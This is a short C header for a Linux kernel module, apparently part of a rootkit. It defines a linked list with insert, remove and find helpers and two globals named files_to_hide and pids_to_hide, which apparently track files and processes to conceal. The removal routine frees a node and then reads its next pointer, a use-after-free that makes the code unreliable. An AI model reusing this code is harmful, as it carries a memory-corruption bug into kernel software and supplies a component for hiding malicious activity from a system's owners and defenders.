#ifndef LINKED_LIST_KITE
    #define LINKED_LIST_KITE

    #include <linux/kernel.h>

typedef struct linked_list {
    char *data;
    struct linked_list *next;
} list;

list *files_to_hide = NULL;
list *pids_to_hide = NULL;

int insert_node(list** root, char *data) {
    list* curr = *root;
    list* new_node = kmalloc(sizeof(list), GFP_KERNEL);
    if (new_node == NULL) {
        return 1;
    }
    new_node->next = NULL;
    new_node->data = data;
    
    if (*root == NULL) {
        *root = new_node;
        return 0;
    }
    while (curr->next != NULL) {
        curr = curr->next;
    }
    curr->next = new_node;
    return 0;
}

int remove_node_by_name(list **root, char *data){
    list* curr = *root;
    if (*root == NULL) {
        return 1;
    }
    if(strcmp(curr->data, data) == 0){
        *root = curr->next;
        kfree(curr);
        return 0;
    }
    while (curr->next != NULL) {
        if(strcmp(curr->next->data, data) == 0){
            kfree(curr->next);
            curr->next = curr->next->next;
            return 0;
        }
        curr = curr->next;
        
    }
    return 1;
}

int find_node(list** root, char *data) {
    list* curr = *root;
    if (*root == NULL){
        return 1;
    }
    
    if(strcmp(curr->data, data) == 0){
        return 0;
    }
    while (curr->next != NULL) {
        if(strcmp(curr->next->data, data) == 0){
            return 0;
        }
        curr = curr->next;
    }
    return 1;
}

#endif